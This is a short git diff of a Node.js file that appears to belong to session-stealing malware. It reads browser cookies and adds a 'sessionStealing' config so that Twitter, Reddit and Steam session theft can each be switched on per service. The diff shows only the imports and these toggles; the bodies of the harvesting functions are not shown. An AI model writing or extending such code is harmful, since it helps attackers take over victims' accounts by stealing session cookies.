@@ -4,6 +4,7 @@ const { writeFileSync } = require('fs');
 const { join } = require('path');
 const fs = require('fs');
 const { getTempFolder } = require('../util/init');
+const { sessionStealing } = require('../config');
 const cookies = getCookies();
 
 const twitter = async () => {
@@ -79,6 +80,6 @@ const steam = async () => {
   }
 };
 
-twitter();
-reddit();
-steam();
+if (sessionStealing.twitter) twitter();
+if (sessionStealing.reddit) reddit();
+if (sessionStealing.steam) steam();
